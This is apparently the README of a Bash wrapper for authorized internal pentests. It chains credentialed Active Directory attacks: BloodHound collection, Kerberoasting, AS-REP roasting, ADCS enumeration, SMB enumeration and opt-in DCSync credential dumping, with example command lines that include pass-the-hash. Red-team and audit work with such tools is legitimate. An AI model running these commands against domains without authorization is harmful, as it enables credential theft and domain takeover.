# AutoBAKED

**Auto**mated **B**loodhound **A**D Enumeration **K**erberoasting **E**tc. **D**ingleberry?

A single Bash wrapper that runs a gamut of **credentialed** Active Directory attacks and
enumeration during an internal pentest, and saves the **full output of every tool** as
evidence in an organized, timestamped loot directory.

> ⚠️ **Authorized use only.** This tool is for engagements you have explicit written
> permission to perform. You are responsible for how you use it.

## Modules

| Module | Tool | Notes |
| --- | --- | --- |
| BloodHound collection | `bloodhound-python` | Full `-c all` collection, zipped |
| Kerberoasting | `impacket-GetUserSPNs` | Requests TGS, saves hashcat-ready hashes |
| AS-REP roasting | `impacket-GetNPUsers` | Finds accounts without Kerberos pre-auth |
| ADCS enumeration | `certipy find` | Flags vulnerable templates (ESC1–8) |
| SMB enum suite | `netexec` | shares, users, groups, pass-pol, MAQ, LAPS, gMSA, sessions, logged-on **(opt-in)** |
| secretsdump / DCSync | `impacket-secretsdump` | **AGGRESSIVE** — explicit `--dump` only |

Every tool's raw stdout/stderr is captured per-module; roasting hashes are additionally
extracted into hashcat-ready files as a convenience (nothing is *just* hashes).

## Requirements

`bloodhound-python`, `impacket` (GetUserSPNs / GetNPUsers / secretsdump), `certipy`(-ad), and
`netexec`. If a tool for a selected module is missing, AutoBAKED lists it and (unless `-y`)
offers to install it via `pipx` (preferred) or `apt-get`. Anything still missing afterward is
skipped — the run never aborts because of one missing tool.

DC auto-discovery uses `host` + `getent` (skip it by passing `-i`).

## Usage

```
./AutoBAKED.sh -u <user> (-p <pass> | -H <[LM:]NT>) -d <domain> [module flags] [options]
```

**Required:** `-u/--user`, `-d/--domain`, and one of `-p/--password` or `-H/--hashes`
(you'll be prompted for a password if you give neither).

**Options**

| Flag | Meaning |
| --- | --- |
| `-i, --dc-ip <ip>` | Domain Controller IP (auto-discovered via DNS SRV if omitted) |
| `-t, --targets <file>` | Target list for the SMB module (defaults to the DC if omitted) |
| `-o, --output <dir>` | Base directory for the loot folder (default: current dir) |
| `-y, --yes` | Non-interactive: no menu, no install prompts |
| `-h, --help` | Show help |

**Module flags** (if none are given on a terminal, an interactive menu appears)

`--bloodhound` · `--kerberoast` · `--asrep` · `--certipy` · `--smb` · `--dump` ·
`--all` (all low-impact modules; **never** enables `--dump`).

### Authentication

- **Password:** `-p 'P@ssw0rd'`
- **Pass-the-hash:** `-H <NThash>` or `-H <LMhash:NThash>` (a bare NT hash is fine).

### Interactive menu

Run with no module flags on a terminal to get a toggle menu:

```
Select modules to run:
  [x] 1) BloodHound collection      (bloodhound-python)
  [x] 2) Kerberoasting              (impacket-GetUserSPNs)
  [x] 3) AS-REP roasting            (impacket-GetNPUsers)
  [x] 4) Certipy / ADCS enum        (certipy find)
  [ ] 5) SMB enum suite             (netexec)          [opt-in]
  [ ] 6) secretsdump / DCSync       [AGGRESSIVE]
   a) toggle all low-impact   r) run selected   q) quit
```

`a` toggles only the low-impact modules (1–5); the aggressive `#6` must always be selected
deliberately.

## Output layout

```
autobaked-loot_<domain>_<timestamp>/
  autobaked.log                    # master transcript (passwords masked)
  bloodhound/  <domain>_bloodhound.zip + json
  kerberoast/  GetUserSPNs.log  + hashes_kerberoast.hashcat
  asrep/       GetNPUsers.log   + hashes_asrep.hashcat
  certipy/     find.log + certipy_Certipy.json/.txt (+ BloodHound zip)
  smb/         shares.log users.log groups.log pass-pol.log maq.log laps.log gmsa.log ...
  aggressive/  secretsdump.log + secrets.*          # only with --dump
  SUMMARY.txt                      # module -> status/path/metric
```

## Examples

```bash
# Interactive menu (default low-impact profile pre-selected)
./AutoBAKED.sh -u jdoe -p 'P@ss' -d corp.local

# Every low-impact module, non-interactive
./AutoBAKED.sh -u jdoe -p 'P@ss' -d corp.local --all -y

# Pass-the-hash, roasting only
./AutoBAKED.sh -u jdoe -H 5f4dcc3b5aa765d61d8327deb882cf99 -d corp.local --kerberoast --asrep

# SMB suite against a host list, DC pinned
./AutoBAKED.sh -u jdoe -p 'P@ss' -d corp.local --smb -t hosts.txt -i 10.0.0.1

# Include the aggressive DCSync (requires explicit --dump)
./AutoBAKED.sh -u jdoe -p 'P@ss' -d corp.local --all --dump -y
```

## Security note

AutoBAKED masks passwords in its own logs, but the underlying tools accept credentials as
command-line arguments and therefore expose them in the host's process list (`ps`) while
running. This is inherent to those tools and is unavoidable from a wrapper.
